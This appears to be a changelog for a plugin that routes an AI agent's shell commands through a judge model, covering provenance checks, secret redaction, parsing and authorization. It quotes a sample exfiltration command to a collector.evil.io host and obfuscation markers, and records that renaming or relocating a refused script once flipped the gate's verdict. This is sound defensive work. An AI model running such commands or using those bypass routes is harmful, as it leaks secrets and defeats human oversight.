## 2026-09-25

### Measured network provenance (policy `jev-v2.3`)

- `curl http://localhost:8000/…` and `ssh raw-ovh …` were the two most common network false-asks in the measured decision log (`declared scope contradicts command (network)`, ~6% of blocks in the 09-09 to 09-17 window): the state carried no provenance for the called host, so every command that happened to use a remote-looking URL was judged on the shape of its text alone. New `measureNetworkProvenance` in `jev.ts` (issue #65, the tier rule of #63) runs before the battery is asked and measures the command's own destinations against this machine's own naming:
  - `localPorts` — the ports the command names on a loopback address (`localhost`, `127.0.0.0/8`, `::1`, `*.localhost`), read from its URLs, an `ssh -p` destination, or `nc host port`.
  - `knownHosts` — the hosts the command names that this machine's own SSH config, hosts file, or running docker container names also name, each with the source it was measured in. This is what catches `raw-ovh`, which lives in the user's `~/.ssh/config`.
  - `dockerNetworks` — a compose service the local compose file declares (read from the `-f` file the command names, else the default compose file names in the working directory), or a loopback port a running container publishes. `docker ps` runs once per burst, cached 3s and aborted at 2.5s; a daemon that is not running yields no measurement, not an error.
  - `resolvesLocally` on each of those targets — which machine actually runs it. The file on this disk is configuration, not execution provenance: `docker -H tcp://prod:2376 compose -f compose.yaml exec web …` runs `web` on prod, whatever the working directory declares. The daemon is measured from the command's own `-H`/`--host`/`-c`/`--context`/`--config` (and a `docker-compose` CLI's own globals before its subcommand), else from this machine's `DOCKER_HOST`/`DOCKER_CONTEXT`, else from the context `docker context use` made current (`config.json` plus the context's `contexts/meta/<sha256(name)>/meta.json`), else the CLI's own default socket; `--config <dir>` names the directory that last part is read from. Every selector a chain carries is resolved together and the claim holds only when they agree — a local `DOCKER_HOST` beside a `DOCKER_CONTEXT` naming another machine measures nothing, because which of them the CLI's precedence picks (its reference and its implementation disagree) is not recorded in this machine's state. A `unix://`/`npipe://` socket or a loopback `tcp://`/`http(s)://`/`ssh://` host is this machine, so `resolvesLocally` is true; another host makes it false; a spelling this gate cannot read (a bare `host:port`, an unreadable context endpoint, `fd://`) leaves the field **absent** — an unmeasured daemon is never claimed as local. The same gate applies to the port table: when this machine's own environment points the gate's own daemon elsewhere, `docker ps` lists that host's containers and nothing from it is measured. A `-f` path that cannot be read already yielded no target for that invocation at all — it is not evidence either way — and the file's silence about a service is never evidence about the machine that runs one, so the compose tier no longer reads the `-f` file as anything but a list of declared names.
- The field rides the state beside `gitPushProvenance` with the same authority note, and the criteria for `sends_local_data_outbound` and `contacts_remote_endpoint` name it by backticked path in both batteries — the lesson from the force-push landing is that an unnamed field does not get used. Loopback traffic is this machine reading itself; an SSH alias that resolves in this machine's own config is the user's own host, still judged on what the command does to it. The non-goal stands: `ssh <alias> <destructive command>` is destructive on its command body, not on its hostname.
- Trust constraint: every name is measured by the gate from this machine's own files and process state, never reported by the command's author, and nothing in the measurement opens a socket. A destination the gate could not measure produces no field at all — absence means "nothing measured", never "trusted" — and a command that names no network destination carries no provenance key.
- The measured tier rides the bash cache key beside the push provenance, and the eval-tool cache key too: a destination that stops being this machine's own invalidates the cached verdict. (Push provenance stays a bash-path measurement; an eval payload is not a shell command.)
- `JEV_POLICY_VERSION` is now `jev-v2.3`, and the jev-v2 battery has moved twice across this one unreleased release, both deliberately: the egress and remote-endpoint criteria text changed for #65, and then again for the #121 review, where those criteria stopped saying that a compose service this machine's compose file declares runs on this machine (the daemon decides that, not the file, and the egress criterion's carve-out for such a service was the more dangerous half). The pinned question digest moves `29ed2ae6375f9d549d7c7631589406764759f7c2a2e68e5f039be815e232d680` → `40377ca248dffb53114b8269d7bdd7f8899ca38c54510fba100859231282cbac` → `14b1fbfbe041a60ac0dee7e251930dbad8cd8b8409205fa2f2699270fad8ea25` and the policy hash `87c99bf634aa9c64` → `ab5086da2469c722` → `9471947eb279787d`, so every cached verdict clears once for the release and the v3 shadow week's baseline moves with it. The pin in `tests/jev.test.ts` is a detector; it fired on purpose for each move and records the previous pair.
- The harness stays machine-independent: `eval/run.ts` passes no measured tier, because the corpus cases name hosts that exist on no particular machine, and a score that depended on this laptop's docker table would not be reproducible. The battery hash moved, so cached answers are re-drawn anyway.
- Known residual, pinned by a test: a URL is read as a destination wherever it is written, including inside a quoted message (`echo 'see http://host/'`); a *bare* host named inside a quoted message is not, because a remote verb is only read at the start of a segment. A compose file that declares its services through `include:`/`extends` measures as declaring none, which fails closed (no carve-out claimed).

### Judge the script body, not its path (#67)

- Where a script lived decided whether it ran: `python3 .scratch/x.py` was judged as command TEXT, so a byte-identical script refused under the old `/tmp` provenance rule ran from the assigned worktree, and renaming a refused script flipped the verdict (measured in the 2026-09-16 autodream run: ~28 `/tmp` refusals, ~8 worktree runs, one rename). New `readInterpretedScriptBodies` (index.ts) reads the file an interpreter operand names and splices each body into the text the gate judges, fenced with `# --- <verb> runs <operand>; body read from disk ---` labels, exactly the way a heredoc body already rides the command. Every layer below reads that text: the built-in critical patterns, the forced-dialog token scan, the verdict cache key, the session and persistent grants, the refusal record, the judge state, and the dialog body — so the human approves the same text the judge saw.
- Discovery is verb-position only, after wrappers and assignments, the same rule the pipe scan uses (`ps aux | grep python` is still not an invocation). The interpreter's own operand (`python3 x.py`, `bash probe`, `php -f x.php`) is read strictly; a word reached past a subcommand or a loader flag (`bun run x.ts`, `node -r ./pre.js main.js`) is read best-effort, because the same spelling is also a package.json script or a data argument. Inline code (`-c`/`-e`/`-p`), stdin (`-`, `-s`), php's `-r` and `python3 -m pkg` keep their existing treatment and the file rule leaves them alone. An interpreter line inside a heredoc *document* is data to the shell and is not a program. A flag whose value word is a file the interpreter runs (`bun --preload ./pre.ts`, and bun's `--require`/`--import`/`-r` aliases of it) is read like an operand — the program slot stays open for the word after it — and a flag whose value is a setting is consumed as one; the per-verb grammar is the interpreter's own (`lua -- script.lua` ends the options and still runs `script.lua`, `osascript -i script.applescript` takes no value, `python3 -W ignore payload` runs `payload`).
- Fail closed on every program the classifier cannot read in full, with layer `script-body` and before any static rule, grant, or dialog can approve text nobody read: a word the shell would expand (glob, variable, substitution), a directory (python would open its `__main__.py`), a special file, an unreadable or short-read file, and a body that cannot fit the review limit. The body shares `maxCommandLength` with the command, and the refusal names the operand and the bytes. A file that is not there is left alone: it runs nothing, and the write-then-run heredoc compound whose body already rides the command text keeps working. A program word is resolved against the directory its own command segment runs in, and a `cd` chain the text cannot pin — an expanded or stacked target, a `||` head whose `cd` may or may not have taken effect — makes the later program a refusal rather than a read from a guessed directory; the `||` branch itself is still read from the directory its `cd` found, which is where it really runs.
- The entry file only. `import`/`require`/`source` targets and `python3 -m pkg` are resolved by the interpreter's own rules (sys.path, NODE_PATH, extension lookup, dynamic specifiers); a half-resolver here would read the wrong file and say nothing about the right one.
- A body that matches the interpreter-code markers (`exec(`, `subprocess`, `base64`, `os.system`, `\xNN`) keeps its flag on a SAFE, the same as an inline `-c` payload: a script that re-execs or decodes its real work is not code the classifier read. Shell-shaped lines in the body (`rm -rf ./out`) reach the forced-dialog token scan and the built-in critical list as ordinary text.
- Two interactions worth knowing: a host allow rule no longer short-circuits a call whose body was read (the rule matched the command text, not the file, and the file decides what runs), and grants, the verdict cache and the refusal memory now key on the spliced text, so rewriting a script re-asks instead of riding the previous body's verdict or grant.
- No policy bump: the battery, the criteria and the derivation rules are unchanged. The cache key carries the body, so a rewrite can never reuse a verdict, and nothing persisted a verdict across a reload.

### Evidence redaction (policy `jev-v2.2`)

- A secret word anywhere among a name's words, split on `_`, `-`, `.` and camelCase, now makes the name secret: `CLIENT_SECRET_VALUE`, `PRIVATE_KEY_PEM`. A usage setting named with `token` (`TOKEN_LIMIT`) redacts too; a name ending in a file extension (grep output) doesn't. (Found by the Codex gate on #110.)
- One definition of a secret name, `isSecretName` in `redact.ts`, now serves redaction and the floor alike: `password`, `passphrase` or `passwd` anywhere, a secret word after `_` or `-` (`DJANGO_SECRET_KEY`, `GH_TOKEN`), or a secret word alone (`token`, `secret`). So `SSH_PASSPHRASE_FILE=` is redacted, and the floor counts it as a secret source. `$PWD`, a bare `$KEY` and `max_tokens` are not secret. (Found by the Codex gates on #110 and #112.)
- Secret-shaped values are now redacted from every evidence field before it reaches TypeSafe: tool calls and results, bash commands and output from earlier in the session, the agent's `operatorContext`, and user messages. Before this, a tool result that printed a key went to the judge at up to 700 characters. It's Phase 2 step 7 of the intent-aware judgment plan, and the one live change in Phase 2.
- New `redact.ts` matches known token formats (Anthropic, OpenAI, GitHub, Slack, AWS, Google, GitLab, npm, JWTs), PEM and PGP private key blocks, and the password in a URL. After a secret marker followed by `:` or `=` (`Authorization:`, `Set-Cookie:`, `API_KEY=`, `"password":`), or used as a flag with its value after a space (`--password hunter2`), it redacts everything to the end of the line, whatever the scheme or quoting. The text rules and the structural pass share one marker list. There's no header or quoting grammar left to miss. Tool-call arguments are also redacted structurally before they're serialized: every value under a secret-sounding key goes whole.
- Every piece of evidence is redacted before it's cut to length, so a key at the cut can't leak half. Every `hash=` digest in tool evidence covers the redacted text, so it can't be used to test password guesses offline. An action target in the authorization state that looks like a secret becomes `[redacted]` instead of an unsalted hash.
- The cost is over-redaction, which is the safe direction: the rest of a line after a secret marker is gone. `{"password":"x","user":"bob"}` loses `bob`, and a user's line reading "Authorization: I approve the deploy" loses its words. `token` counts only in the singular, so usage fields like `max_tokens: 1024` stay readable.
- The command being judged is sent unredacted. Hiding its key would hide the hazard.
- A secret with no known shape and no secret-sounding name still gets through.
- `JEV_POLICY_VERSION` is now `jev-v2.2`, which changes the policy hash (the pinned value moves from `419a39187f6efc67` to `87c99bf634aa9c64`) and clears every cached verdict once. The battery text and its pinned digest are unchanged.

### The jev-v3 decision order

- New `decision-order.ts`: Phase 2 step 5, the plan's seven-branch decision order for jev-v3. `deriveDecisionOrder` is pure. It reads the jev-v3 risk answers, `deriveAuthorization`'s level, the literal-match result, the overlay flags and `headless`. First match wins: injection, then a one-hot hazard, jev-v2's safe gate, a firm `named` over a fully matched command, the reviewer for `named` or `goal`, overlay flags with no authorization, and last jev-v2's own derivation. Every decision carries its `branch` and a reason code starting `jev-v3:<branch>:`.

In a headless session, a block-band hazard or an unsafe-leaning verdict skips the fast allow and goes to branch 5. The eval tool has no literal match, so it never takes branch 4.
- `judgeJevV3` in `jev-judge.ts` asks the jev-v3 battery and the authorization question in parallel, each over its own state. A failed risk request throws `JevUnavailableError`. A failed authorization request leaves the risk answer standing and reports `authorization: undefined`, which reads as `none`.

### The shell parser (#96)

- Commands are now read by a real bash parser, `mvdan-sh`, instead of hand-rolled splitters. `shell-ast.ts` is the only module that imports it. It returns a flat list of commands, each with its words, assignments, redirects, how it joins the command before it, and whether it runs inside a substitution. Each word links to the commands its `$(…)` runs. A parse failure returns `{ ok: false }`, and every caller treats that as "not read".
- `floor.ts` and `literal-match.ts` read that view, and the host's `tokenizeShellSegments` is gone from both. The floor finds each secret within a single word and takes the sink from the word's position, so `-sTconfig/secrets.pem` asks without any flag splitting. A command the parser rejects asks under a new floor entry, `unread-command`.
- Each word's value is the string bash produces: backslashes removed, `$'…'` decoded and cut at a NUL, and an unset variable's default taken (`${SAFE:-key.pem}` checks `key.pem`). Brace expansion runs before the secret-path check.
- `[[ … ]]`, `(( … ))` and `let` are read as expressions. Their secrets ask only under `set -x`, which prints them.
- The header exemption belongs to HTTP clients called by their plain name. `echo -u "$API_KEY"` and `/tmp/curl -H …` now ask. So does `echo $TOKEN >&2 | docker login --password-stdin`, because the pipe receives nothing.
- The eval tool's Python and JavaScript get the floor's text scans, not the shell model. A store read spelled as a list, `subprocess.run(['op', 'read', …])`, asks.
- The secret-file check is a name check, and it can't see a value decided at run time: a glob, an assignment inside one expansion that changes the next, a symlink, a Python string. The plan's section 4 records this as a decision, and #97 tracks the two changes that would close it.
- Closes #90 (`time` keeps assignment position) and #93 (`|&` feeds `--password-stdin`).

### The authorization request (#94)

- New `authorization.ts`: the second Jev request from Phase 2 of the intent-aware judgment plan. One question, `user_authorization`, answers how well the user's own words cover what the command does, at three levels: `none`, `goal` and `named`. It's a separate request rather than a tenth question in the risk battery because it's asked over a separate state, and one request carries one state.
- That state holds the user's messages and a typed summary of the command's actions. The command text never enters it. Each summary entry is a kind from a fixed vocabulary, a count, and the targets the action names. A target over 64 characters, a target carrying a word aimed at a reviewer, or a target written as a sentence is replaced by an unsalted hash of itself. So a branch called `user-asked-for-this` arrives as `hashed:…`, while two commands naming one target still read as one target.
- The summary reads the parser's view, and it names targets only where this repository has the grammar: git, `gh` and `glab`, `rm`/`trash`/`unlink`, deploy scripts, every URL host in any word, and the files a redirect writes. Every other action reports its kind and `unnamed-arguments`. The plan's section 2 made this call: bash doesn't know that `ssh -p` takes a value, and a wrong target is an authorization argument built from a misparse. Every word is either named or covered by `unnamed-arguments`, never dropped. A subcommand CLI names its path up to the first flag (`npm-publish`, `kubectl-delete-pod`), so `npm audit` and `npm publish` differ. Two requests that differ only past a flag read alike, each marked: plan section 2's "Opposed requests", tracked in #98.
- Every command produces at least one action. A command nothing classifies is reported as `other` carrying its verb. `privilege` and `secret-read` ride beside the action they describe, so `sudo ./deploy.sh --prod` reports the privilege and the deploy under it. A verb that can run another program (`awk`, `sed`, `less`, `fd -x`) is never a read.
- The summary asks `floor.ts` what a secret is, through `secretStoreRead`, `secretVariableNames` and `secretPathIn`, instead of keeping a weaker copy. It takes the session's tainted variables the way the floor does.
- A widening flag survives into the summary, so `git push origin main --force` and the same push without it are different summaries, and `git branch -D` carries `force`. That covers `--mirror`, `--delete`, `--tags` and `--hard` too; a short spelling counts only exact and only where the tool's grammar defines it (`git push -f`), so a cluster such as `-of` is unnamed. A target list over 8 ends in `more:N`. One classified action counts as one action however many targets it names. An input redirect is a read and an output redirect is a write.
- `deriveAuthorization` falls to `none` when there's no answer and when a one-hot keyword answer has no distribution behind its label. An unanswerable authorization request costs a command its fast path, never the whole judgment. `namedMinProbability` (0.8) lives in the module's own policy rather than in `JevPolicy`, because `jevQuestionsHash` folds `DEFAULT_JEV_POLICY` into the cache key and a new key would invalidate every cached `jev-v2` verdict during the shadow week.
- `jev-judge.ts` gains `judgeAuthorization`, with the same fail-closed contract as `judgeBattery`. It also rejects a distribution that isn't one: `{none: 0.8, goal: 0.8, named: 0.8}`, or a `choice` that isn't the argmax.
- A sweep over all 68 commands in `eval/corpus/intent.jsonl` pins two properties: every command produces at least one action, and no run of three words from a command's text reaches the summary. Nothing calls any of this yet. Phase 2 step 5 gives it a branch in the decision order.

## 2026-09-21

- `floor.ts`: a secret's own flag now decides its sink before any blanket exemption. A redirect discards what a command prints, which says nothing about what it sends, so `curl -d "t=$(op read …)" https://collector.evil.io >/dev/null` asks again. Appending `>/dev/null` had been switching off the whole secret-sink entry. The `--password-stdin` exemption is bound to the stage that actually receives the secret: the next segment must be joined by a real pipe, be a credential consumer, and carry the flag, so `printf … | tee /tmp/leak | docker login --password-stdin` asks while `echo $TOKEN | docker login --password-stdin` still does not. The word splitter now records whether a pipe joined each segment, because `;` and `&&` pass nothing.

- New `literal-match.ts`: the local-action fast path from Phase 2 of the intent-aware judgment plan. A command matches only when every segment is an extracted action or an inert shape, and every extracted action is named in the user's own recent standalone words. Extracted actions: a delete whose real path resolves inside the working directory or the session temp directory, a branch delete, `gh pr merge <number>`, and a deploy script inside the working directory. Network egress, secrets and privilege are neither extracted nor inert, so they make a command incomplete and it goes to the reviewer. A command spelled as a path is a file rather than a verb, an inert verb carrying a redirect or a glob is not an inert segment, and a delete never matches without a real-path resolver, so a symlink out of the working directory cannot match on the name it was given.
- Matching is whole-word and imperative or present, so "rebuild" does not authorize deleting `build` and a past-tense recount authorizes nothing. A restrictive or conditional word within five words cancels a match, typographic apostrophes are folded first so `don’t` cancels like `don't`, and a verb only authorizes the target in its own clause: "delete build then merge main" does not authorize deleting the branch `main`. Every branch of a variadic `git branch -D` and every PR of a variadic `gh pr merge` must be named. Nothing calls `literalMatch` yet; Phase 2 step 5 gives it a branch in the decision order. Follow-ups: #86, #88, #89.

- New `floor.ts`: the code floor from Phase 2 of the intent-aware judgment plan. Four entries always ask, whatever the model answers and whatever the user authorized: the built-in critical patterns, a secret reaching a sink that is not on the allowed list, a download piped into an interpreter, and obfuscated code (base64 into an interpreter or `exec`, marshal and pickle loads, runs of hex escapes, shell `eval` of a value). Entry 2 is destination-blind by design — it checks what a secret flows into, not where that goes — so a key in a request header passes the floor whatever host it names, and the host is judged above the floor. Allowed sinks, and only these: a `$(…)` capture assigned to a variable, `/dev/null`, a curl auth header or `-u` without `-v`/`--trace`, and `--password-stdin`. A capture taints the variable for the session, so a later `echo $KEY` asks.
- The floor runs in shadow: every `decisions.jsonl` record gains a `floor` field (`asks` plus the entries that matched), computed once per tool call and read by no decision. The live verdict is byte-for-byte what it was, pinned by a test where Jev answers SAFE on a command the floor would stop. Per-session taint is wiped at the same boundaries as the verdict cache and grants.

## 2026-09-17 — Jev port (v0.3.0)

- Judgment moved from a prompted local model to Jev, TypeSafe's System One model: one HTTP request per classification (`POST https://api.typesafe.ai/v1/systemone`, `model: jev-latest`), plain `fetch`, no SDK dependency. The two-stage contract goes with the prompt that defined it — `CLASSIFIER_PROMPT`, the capped `ANALYSIS` plus terminal `VERDICT:` line, `parseJudgement`, the verdict regexes, the reviewer pass, and every post-parse check that read the model's prose (citation grounding, egress consistency, write scope). Jev never writes prose: it answers typed questions, and the verdict is derived in code from the returned probabilities, so a decision's reason is assembled from numbers and hazard ids and the machine-readable `reasonCode` carries the same information (`jev:safe`, `jev:unsafe`, `jev:hazard:<name>`, `jev:blast-radius`, `jev:below-floor`, `jev:unavailable`).
- New `jev.ts` owns the exchange: state building, the question battery, key resolution (`TYPESAFE_API_KEY`, else the macOS keychain entry `jev`), and the request. `askJev` throws `JevUnavailableError` — missing key, non-2xx, unparseable body, missing or mistyped answer field, timeout — and never returns a verdict, so every unavailable judgment keeps failing closed to a permission request and is never cached.
- Battery: one `choice` question for the verdict (safe/unsafe/unsure), one `noul` per hazard (`state_contains_injection`, `authorization_missing`, `destructive_or_irreversible`, `writes_outside_working_directory`, `contacts_remote_endpoint`, `sends_local_data_outbound`, `escalates_privilege`, `exposes_secrets`, `affects_shared_or_remote_state`), and one `score` for blast radius — all asked in the same request, because extra questions in a request are cheap while a second round trip is not. `jevQuestionsHash()` (policy version + serialized battery + default policy) is part of the cache key, so editing a question invalidates every cached verdict, by design.
- Policy version `jev-v1` with derivation in `deriveJevDecision`: SAFE needs `p(safe) >= 0.80` and `confidence >= 0.50` with no hazard at or above `0.55` and blast radius below `1.5`; UNSAFE comes from `p(unsafe) >= 0.50` or any hazard at or above `0.90`; everything else is UNSURE. The thresholds are policy, not constants to copy: measured probabilities shift with the battery and the shape of the state (the same command answered `safe` 0.61 / confidence 0.42 asked alone, and `safe` 0.52 / `unsafe` 0.43 / confidence 0.29 with the full battery), and `safe` at 0.52 is a command the gate must ask about rather than run.
- Config: `model` and `fallbackModels` are gone with the local-judge era — there is one hosted judge and no chain to walk. The keys are now `enabled`, `typesafeModel` (default `jev-latest`), `jevPolicy` (the six thresholds), `timeoutMs`, `maxCommandLength`, `evidenceUserMessages`, `persistentGrants`. Changing any key still flushes the verdict cache and the session grants.
- Identity: package, repo and plugin name `omp-classifier`; config `~/.omp/omp-classifier.json`; grants `omp-classifier-grants.json`; artifact dir `<agentDir>/omp-classifier/` for `decisions.jsonl` and the status report; env overrides `OMP_JEV_CONFIG` and `OMP_JEV_TEST_LOCKFILE`. Upgrading: `omp plugin uninstall omp-classifier`, then `omp plugin install .` — two bash gates installed at once both intercept `tool_call`.

- Two-stage reasoning contract (`contract: analysis+verdict`, now shown by `/classifier` and in `/classifier status`): the prompt requires a capped ANALYSIS (~120 words: files/directories touched, what executes, network egress destinations, reversibility, mapping to the user's own words) before a final line exactly `VERDICT: SAFE|UNSAFE|UNSURE` with an optional `REASON:`; `parseJudgement` anchors on that labeled line — scanned from the start of the reply and matched only as a whole line, so mid-sentence verdict talk still fails closed — and captures the analysis for the checks below. Legacy one-line replies that open with the verdict token still parse; analysis without a VERDICT line stays PARSE_ERROR (permission request, not cached). Prompt `def2c11736e2` → `7b4f082ad07c`.
- Authorization grounding: a SAFE whose analysis/reason quotes user authorization must find those words verbatim (whitespace-normalized substring) in `evidence.userMessages`; `checkCitation` downgrades a fabricated quote to UNSURE "cited authorization not found in session evidence" — a dialog that is never cached (`noCache`). No evidence at all is a no-op (never a dialog cause on its own), an unquoted paraphrase has no words to verify and does not fire, quotes that echo the command text are not citations, and UNSAFE/UNSURE verdicts are never touched.
- Scope-consistency checks (deterministic, post-parse, SAFE only): egress — an analysis that declares "no network egress" or never addresses egress while the command carries an uncleared network verb (curl/wget/ssh/scp/sftp/nc variants/telnet/gh) downgrades to UNSURE "declared scope contradicts command (network)"; cleared read-only fetches keep their per-pipeline clearing and never re-trigger, mid-pipeline verbs never clear. Write-scope — an analysis that claims writes stay in the working directory (or is silent about writes) over an absolute/`~` redirect, `tee`, or `-o`/`--output` target outside cwd downgrades "…(write target)"; `/dev/null` and temp locations are excluded, relative targets never fire, and an analysis that discusses writes without claiming confinement defers to the verdict. Both checks are conservative by construction — when unsure they stay silent, so they cannot open a new over-flag family — and both mark the downgrade `noCache`.
- The classify call pins `maxTokens` at 4000: a reasoning-modeled judge can spend the whole budget on thinking before the first text delta (measured: glm-5.3 consumed a 700-token budget entirely on thinking deltas and never reached the verdict), and a truncated reply is a PARSE_ERROR under the new contract.
